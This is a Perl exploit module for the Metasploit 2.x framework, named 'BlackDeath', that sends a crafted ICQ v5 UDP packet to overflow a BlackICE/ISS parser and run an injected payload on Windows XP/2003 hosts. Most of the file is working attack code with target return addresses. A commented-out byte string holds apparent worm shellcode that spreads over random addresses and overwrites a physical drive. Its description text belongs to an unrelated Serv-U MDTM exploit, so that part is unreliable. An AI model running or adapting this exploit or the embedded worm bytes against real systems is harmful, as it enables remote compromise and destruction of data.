package Msf::Exploit::blackice_pam_icq;
use base 'Msf::Exploit';
use strict;
use Pex::x86;
use Pex::Utils;

my $advanced = {

};
my $info =
{
  'Name'  => 'BlackDeath',
  'Version'  => '2.0',
  'Authors' =>
    [
      'spoonm <ninjatools [at] hush.com>',
    ],
  'Description'  => qq{

  This is a exploit for Serv-U's MDTM command.
  It has been tested against versions 4.0.0.4/4.1.0.0/4.1.0.3/5.0.0.0 with
  success (against nt4/2k/xp/2k3). The bug was fixed in version 5.0.0.4.
  The bug exists in versions older than 4, but this exploit will not exploit it.
  You only get one shot, but we jump into exe so it should be OS/SP independant.

  },
  
  'Arch'  => [ 'x86' ],
  'OS'    => [ 'win32' ],
  'Priv'  => 0,
  'UserOpts'  =>
    {
      'RHOST' => [1, 'ADDR', 'The target address'],
      'RPORT' => [1, 'PORT', 'The target port', 21],
    },

  'Payload' =>
    {
      'Space'  => 504 - 31 - 4,
      'BadChars'  => "\x00",
#      'MinNops' => 0,
#      'MaxNops' => 0,
#      'PrependEncoder' => "\xcc",
#      'Prepend' => "\xcc",
    },
  'Nop' =>
    {
      'ModStack' => 0, # We don't use nops, but if we did...
    },

  'Refs'  => 
    [  
      'http://archives.neohapsis.com/archives/bugtraq/2004-02/0654.html',
      'http://www.cnhonker.com/advisory/serv-u.mdtm.txt',
      'http://www.cnhonker.com/index.php?module=releases&act=view&type=3&id=54',
    ],
  'Targets' =>
    [
      ['WinXP sp0/sp1', 0x76e61a21], # activeds.dll
      ['WinXP SP1/Win2k3 SP0', 0x77798428], # shell32.dll
    ],
};


sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}


sub Exploit {
  my $self = shift;
  my $targetHost  = $self->GetVar('RHOST');
  my $targetPort  = $self->GetVar('RPORT');
  my $targetIndex = $self->GetVar('TARGET');
  my $shellcode   = $self->GetVar('EncodedPayload')->Payload;

  my $target = $self->Targets->[$targetIndex]->[1];

  my $sock = Msf::Socket->new();

  if(!$sock->Udp($targetHost, $targetPort, 4000) || $sock->IsError) {
    $sock->PrintError;
    return;
  }

  # http://www.cs.berkeley.edu/~mikechen/im/protocols/icq/icqv5.html

#  my $witty = "\x41\x02


  my $request =
    "\x05\x00".           # Version 5
    "\x00".               # Unknown
    "\x00\x00\x00\x00".   # Session ID
    "\x12\x02".           # Command SRV_MULTI
    "\x00\x00".           # Seq Num 1
    "\x00\x00".           # Seq Num 2
    "\x00\x00\x00\x00".   # UIN
    "\x00\x00\x00\x00";   # Checkcode (I doubt this even has to be valid)

  # Packet 1 USER_ONLINE
  my $packet1 =
    "\x05\x00".           # Version 5
    "\x00".               # Unknown
    "\x00\x00\x00\x00".   # Session ID
    "\x6e\x00".           # Command SRV_USER_ONLINE
    "\x00\x00".           # Seq Num 1
    "\x00\x00".           # Seq Num 2
    "\x00\x00\x00\x00".   # UIN
    "\x00\x00\x00\x00".   # Checkcode

    "\x12\x23\x34\x45".   # UIN of user online
    "\x01\x00\x00\x00".   # IP
    "\x00\x00\x00\x00".   # PORT
    "\x00\x00\x00\x00".   # REAL_IP
    "\x00".               # Whatever
    "\x00\x00\x00\x00".   # Online Status
    "\x00\x00\x00\x00";   # Dunno (test) witty did it.
#    "\x00\x00\x00\x00";   # Dunno
#    "\x00\x00\x00\x00".   # Dunno
#    "\x00\x00\x00\x00".   # Dunno
#    "\x00\x00\x00\x00".   # Dunno
#    "\x00\x00\x00\x00".   # Dunno
#    "\x00\x00\x00\x00";   # Dunno
      "";

  my $nick = '';
  my $firstName = '';
  my $lastName = '';

  my $email = 'A' x 19;
  $email .= pack('V', $target); #arg
  $email .= $shellcode;

  # Packet 2 META_USER
  my $packet2 =
    "\x05\x00".           # Version 5
    "\x00".               # Unknown
    "\x00\x00\x00\x00".   # Session ID
    "\xde\x03".           # Command SRV_META_USER
    "\x00\x00".           # Seq Num 1
    "\x00\x00".           # Seq Num 2
# arg
    "\x12\x34\x56\x78".   # UIN
    "\x00\x00\x00\x00".   # Checkcode
    "\x00\x00".           # Subcommand META_USER_FOUND
    "\x0A".               # Success

# Yeah, so the specs and ISS parser differ, I think this should be here
# but ISS parser doesn't expect it.
#    "\x00\x00\x00\x00".                      # UIN

    Pex::x86::numberPack16(length($nick)).        # Nick Length
    $nick.
    Pex::x86::numberPack16(length($firstName)).   # First Name Length
    $firstName.
    Pex::x86::numberPack16(length($lastName)).    # Last Name Length
    $lastName.
    Pex::x86::numberPack16(length($email)).       # Email Length
    $email.
    "\x00".                                  # Authorize (don't ask permission, docs and ethereal conflict)
    "\x00\x00".                              # Whatever
    "\x00\x00\x00\x00";                      # Whatever

  # Multi
  $request .=
    "\x02".                               # Number of packets
    Pex::x86::numberPack16(length($packet1)).  # Size of first packet
    $packet1.
    Pex::x86::numberPack16(length($packet2)).  # Size of second packet
    $packet2;

#  print Pex::Utils::BufferC($request);
#  open(FUCK, ">/home/spoonm/fuckfuck.bin");
#  print FUCK $request;
#  close(FUCK);

#  my $witty = "\x05\x00\x00\x00\x00\x00\x00\x12\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x2c\x00\x05\x00\x00\x00\x00\x00\x00\x6e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x41\x02\x05\x00\x00\x00\x00\x00\x00\xde\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x01\x00\x00\x01\x00\x00\x1e\x02\x20\x20\x20\x20\x20\x20\x20\x28\x5e\x2e\x5e\x29\x20\x20\x20\x20\x20\x20\x69\x6e\x73\x65\x72\x74\x20\x77\x69\x74\x74\x79\x20\x6d\x65\x73\x73\x61\x67\x65\x20\x68\x65\x72\x65\x2e\x20\x20\x20\x20\x20\x20\x28\x5e\x2e\x5e\x29\x20\x20\x20\x20\x20\x20\x20\x89\xe7\x8b\x7f\x14\x83\xc7\x08\x81\xc4\xe8\xfd\xff\xff\x31\xc9\x66\xb9\x33\x32\x51\x68\x77\x73\x32\x5f\x54\x3e\xff\x15\x9c\x40\x0d\x5e\x89\xc3\x31\xc9\x66\xb9\x65\x74\x51\x68\x73\x6f\x63\x6b\x54\x53\x3e\xff\x15\x98\x40\x0d\x5e\x6a\x11\x6a\x02\x6a\x02\xff\xd0\x89\xc6\x31\xc9\x51\x68\x62\x69\x6e\x64\x54\x53\x3e\xff\x15\x98\x40\x0d\x5e\x31\xc9\x51\x51\x51\x81\xe9\xfe\xff\xf0\x5f\x51\x89\xe1\x6a\x10\x51\x56\xff\xd0\x31\xc9\x66\xb9\x74\x6f\x51\x68\x73\x65\x6e\x64\x54\x53\x3e\xff\x15\x98\x40\x0d\x5e\x89\xc3\x83\xc4\x3c\x31\xc9\x51\x68\x65\x6c\x33\x32\x68\x6b\x65\x72\x6e\x54\x3e\xff\x15\x9c\x40\x0d\x5e\x31\xc9\x51\x68\x6f\x75\x6e\x74\x68\x69\x63\x6b\x43\x68\x47\x65\x74\x54\x54\x50\x3e\xff\x15\x98\x40\x0d\x5e\xff\xd0\x89\xc5\x83\xc4\x1c\x31\xc9\x81\xe9\xe0\xb1\xff\xff\x51\x31\xc0\x2d\x03\xbc\xfc\xff\xf7\xe5\x2d\x3d\x61\xd9\xff\x89\xc1\x31\xc0\x2d\x03\xbc\xfc\xff\xf7\xe1\x2d\x3d\x61\xd9\xff\x89\xc5\x31\xd2\x52\x52\xc1\xe9\x10\x66\x89\xc8\x50\x31\xc0\x2d\x03\xbc\xfc\xff\xf7\xe5\x2d\x3d\x61\xd9\xff\x89\xc5\x30\xe4\xb0\x02\x50\x89\xe0\x6a\x10\x50\x31\xc0\x50\x2d\x03\xbc\xfc\xff\xf7\xe5\x2d\x3d\x61\xd9\xff\x89\xc5\xc1\xe8\x17\x80\xc4\x03\x50\x57\x56\xff\xd3\x83\xc4\x10\x59\xe2\x98\x31\xc0\x2d\x03\xbc\xfc\xff\xf7\xe5\x2d\x3d\x61\xd9\xff\x89\xc5\xc1\xe8\x10\x80\xe4\x07\x80\xcc\x30\xb0\x45\x50\x68\x44\x52\x49\x56\x68\x49\x43\x41\x4c\x68\x50\x48\x59\x53\x68\x5c\x5c\x2e\x5c\x89\xe0\x31\xc9\x51\xb2\x20\xc1\xe2\x18\x52\x6a\x03\x51\x6a\x03\xd1\xe2\x52\x50\x3e\xff\x15\xdc\x40\x0d\x5e\x83\xc4\x14\x31\xc9\x81\xe9\xe0\xb1\xff\xff\x3d\xff\xff\xff\xff\x0f\x84\x37\xff\xff\xff\x56\x89\xc6\x31\xc0\x50\x50\x2d\x03\xbc\xfc\xff\xf7\xe5\x2d\x3d\x61\xd9\xff\x89\xc5\xd1\xe8\x66\x89\xc8\x50\x56\x3e\xff\x15\xc4\x40\x0d\x5e\x31\xc9\x51\x89\xe2\x51\x52\xb5\x80\xd1\xe1\x51\xb1\x5e\xc1\xe1\x18\x51\x56\x3e\xff\x15\x94\x40\x0d\x5e\x56\x3e\xff\x15\x38\x40\x0d\x5e\x5e\x5e\xe9\xac\xfe\xff\xff\x63\x76\x07\x5e\xe9\x21\xfe\xff\xff\x00\x43\x66\x6a\x76\x63\x6c\x62\x34\x31\x50\x51\x35\x30\x6a\x48\x31\x50\x63\x34\x50\x51\x55\x59";

#  $sock->Send($witty);
  $self->PrintLine('[*] Sending UDP Request (' . length($request) . ' bytes)');

  $self->PrintLine;
  $self->PrintLine('[*] !!! Note: The connection will not close after shellcode is finished');
  $self->PrintLine('              (atleast when using SEH).  This is because the SEH handler');
  $self->PrintLine('              restarts the daemon after bad exceptions (good for us).');
  $self->PrintLine;

  $sock->Send($request);

}

1;
